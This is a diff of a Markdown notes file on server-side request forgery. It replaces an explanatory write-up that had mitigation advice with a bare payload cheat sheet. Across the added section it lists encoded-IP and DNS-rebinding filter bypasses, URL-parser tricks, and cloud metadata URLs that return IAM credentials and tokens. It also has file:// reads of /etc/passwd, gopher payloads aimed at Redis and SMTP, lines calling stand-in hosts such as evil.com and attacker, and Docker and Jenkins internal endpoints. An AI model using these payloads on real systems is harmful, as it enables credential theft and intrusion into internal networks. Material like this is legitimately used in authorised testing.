@@ -1,126 +1,146 @@
-# Server-Side Request Forgery (SSRF)
+# Server-Side Request Forgery
 
-SSRF occurs when the server makes HTTP requests to URLs supplied by the user — allowing
-the attacker to probe internal networks, read cloud metadata, or attack internal services
-that are not exposed to the internet.
+## Internal Address Probing
+```
+http://127.0.0.1:80          http://127.0.0.1:8080
+http://localhost:80           http://localhost:22
+http://0.0.0.0:80            http://[::]:80/
+http://[0000::1]:80/         http://[::ffff:127.0.0.1]
+```
+## CIDR / Rare Address Bypasses
+```
+http://127.127.127.127       # 127.0.0.0/8 range
+http://127.0.1.3
+http://0/                    # shorthand for 0.0.0.0
+http://127.1                 # shorthand for 127.0.0.1
+http://127.0.1
+```
+## Encoded IP Bypasses
+```
+# Decimal
+http://2130706433/           # 127.0.0.1
+http://2852039166/           # 169.254.169.254 (AWS metadata)
+http://3232235521/           # 192.168.0.1
 
----
+# Hex
+http://0x7f000001            # 127.0.0.1
+http://0xa9fea9fe            # 169.254.169.254
 
-## Basic SSRF (Internal Port Scan / File Read)
+# Octal
+http://0177.0.0.1            # 127.0.0.1
+http://o177.0.0.1
+http://0o177.0.0.1
+```
+## DNS / Redirect Bypasses
+```
+# DNS rebinding — rotate between IPs on each lookup
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
 
-**Category:** SSRF / Internal Network Access
-**Severity context:** High to Critical — pivot into internal infrastructure.
+# nip.io — maps any <ip>.nip.io to that IP
+http://127.0.0.1.nip.io
+http://169.254.169.254.nip.io
 
-### How to identify it
-Look for features where the server fetches a URL on your behalf: webhook callbacks,
-URL previews, link-expander tools, PDF generators, image downloaders, proxy services,
-API gateway forwarding, or social media share previews. Submit a known external URL
-first to confirm the feature works, then try internal addresses.
+# Public redirect services
+http://307.r3dir.me/--to/?url=http://localhost
+http://spoofed.burpcollaborator.net          # redirects to 127.0.0.1
 
-### How it works
-The application takes a URL from user input and makes an HTTP (or other protocol)
-request to that URL using libraries like `curl`, `file_get_contents()`, `requests`,
-`HttpURLConnection`, etc. If the input is not restricted to an allow-list, you can
-point the server at internal hosts (127.0.0.1, 10.x.x.x, 172.x.x.x, 192.168.x.x) or
-special URLs (`file:///`, `gopher://`).
-
-### Exploitation
+# Other domains resolving to localhost
+http://localtest.me
+http://localh.st
+```
+## URL Parsing Discrepancies
+```
+http://127.1.1.1:80\@127.2.2.2:80/
+http://127.1.1.1:80\@@127.2.2.2:80/
+http://127.1.1.1:80#\@127.2.2.2:80/
+http:127.0.0.1/                               # parser-dependent
+```
+## Cloud Metadata Endpoints
 ```bash
-# Probe localhost services
-?url=http://127.0.0.1:80
-?url=http://127.0.0.1:8080
-?url=http://127.0.0.1:3306
+# AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
+http://169.254.169.254/latest/user-data/
 
-# CIDR notation
-?url=http://127.0.0.1:8080
-?url=http://0x7f000001:8080           # hex IP bypass
-?url=http://2130706433:8080           # decimal IP bypass
-?url=http://0x7f.0x00.0x00.0x01      # dotted hex
-
-# DNS rebinding — register a domain that alternates between your server and 127.0.0.1
-# Use rbndr.us or similar service
-
-# Redirect bypass — host a redirect from your server to internal
-# Your server at http://attacker.com/redirect returns 302 Location: http://169.254.169.254/latest/meta-data/
-
-# AWS / GCP / Azure metadata endpoint
-?url=http://169.254.169.254/latest/meta-data/
-?url=http://169.254.169.254/latest/user-data/
-?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
   -H "Metadata-Flavor: Google"
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 
-# File protocol (if supported)
-?url=file:///etc/passwd
-?url=file:///var/www/html/index.php
+# Azure
+http://169.254.169.254/metadata/identity/oauth2/token
+  -H "Metadata: true"
 
-# Gopher protocol — talk to raw TCP services (Redis, SMTP, MySQL)
-?url=gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aauth%0d%0a$...   # Redis command injection
+# DigitalOcean
+http://169.254.169.254/metadata/v1.json
 
-# Blind SSRF detection — Burp Collaborator / external listener
-?url=http://attacker.burpcollaborator.net
+# Alibaba
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/user-data/
 ```
-
-### Example
+## URL Scheme Exploitation
 ```
-Vulnerable endpoint:  POST /fetch-url  {"url": "http://example.com"}
-Payload:              POST /fetch-url  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"}
-Response:             Returns AWS temporary credentials with full API access.
+# File read
+file:///etc/passwd
+file://\/\/etc/passwd
+netdoc:///etc/passwd           # Java netdoc wrapper
+
+# Dict protocol
+dict://127.0.0.1:6379/         # Redis info
+dict://attacker:11111/
+
+# Gopher — send raw TCP to any service
+gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0aauth%0d%0a$...
+gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
+
+# SFTP/TFTP
+sftp://evil.com:11111/
+tftp://evil.com:12346/TESTUDPPACKET
+
+# LDAP
+ldap://localhost:11211/%0astats%0aquit
+
+# JAR (blind)
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
 ```
-
-### Mitigation
-Use an allow-list of permitted domains (never a deny-list). Block access to private IP
-ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254/32).
-Use a dedicated URL parser that validates the scheme (disallow `file://`, `gopher://`,
-`dict://`). Disable redirect following if not needed, otherwise validate the final URL
-after redirects.
-
-### References
-- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
-- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
-
----
-
-## Blind SSRF (Out-of-Band)
-
-**Category:** SSRF (Blind)
-**Severity context:** High — no data returned in response, but can confirm via callback
-and potentially exploit internal services.
-
-### How to identify it
-Same endpoints as basic SSRF, but the response doesn't include the fetched content. You
-must detect SSRF by observing an outbound request from the server (DNS, HTTP) to a
-listener you control.
-
-### How it works
-The server fetches the URL but only uses it internally (e.g. for validation, thumbnail
-generation in the background). You don't see the response, but the server still makes
-the request — which you can observe via DNS logs, HTTP server logs, or timing.
-
-### Exploitation
-```bash
-# DNS-based detection (no HTTP server needed — DNS queries are almost never blocked)
-?url=http://unique-id.burpcollaborator.net
-?url=http://attacker.com/
-# Check your DNS logs for the lookup
-
-# Time-based detection (if server hits a slow endpoint)
-?url=http://127.0.0.1:99999/  # connection timeout takes several seconds
-?url=http://127.0.0.1:22      # fast — SSH is open
-?url=http://127.0.0.1:9999    # slow — timeout
-
-# Shellshock via SSRF (if CGI enabled)
-?url=http://127.0.0.1/cgi-bin/test.cgi
-  # With header injection to trigger Shellshock
-
-# Internal service exploitation (blind)
-# If the server has a vulnerable Redis at 127.0.0.1:6379, use gopher to inject commands
-# Even without seeing the response, you can write an SSH key or create a cron job
+## Blind SSRF — Detection
 ```
+# DNS callback (no HTTP server needed — DNS rarely blocked)
+http://unique-id.burpcollaborator.net
+http://attacker.dnsbin.zhack.ca
 
-### Mitigation
-Same as basic SSRF. Additionally, block egress DNS and HTTP to the internet from the
-application server unless explicitly needed. Use a forward proxy with an allow-list.
+# Timing-based
+http://127.0.0.1:22/      # fast (port open)
+http://127.0.0.1:99999/   # slow (timeout)
+```
+## Internal Service Exploitation (Blind SSRF Chains)
+```
+# Redis — gopher to write SSH key / cron job
+gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a...
 
-### References
-- [PortSwigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
-- [HackerOne: SSRF best practices](https://www.hackerone.com/application-security/how-to-server-side-request-forgery-ssrf)
+# Elasticsearch
+http://127.0.0.1:9200/_search?pretty
+
+# Docker socket
+http://127.0.0.1:2375/containers/json
+http://127.0.0.1:2375/containers/create
+
+# Minio / S3
+http://127.0.0.1:9000/
+
+# Consul
+http://127.0.0.1:8500/v1/agent/self
+
+# Jenkins
+http://127.0.0.1:8080/script
+```
+## SSRF → XSS (via SVG)
+```
+http://target.com/ssrf?url=http://brutelogic.com.br/poc.svg
+```
+## References
+- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
+- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
+- [SSRFmap](https://github.com/swisskyrepo/SSRFmap)
+- [Gopherus](https://github.com/tarunkant/Gopherus)
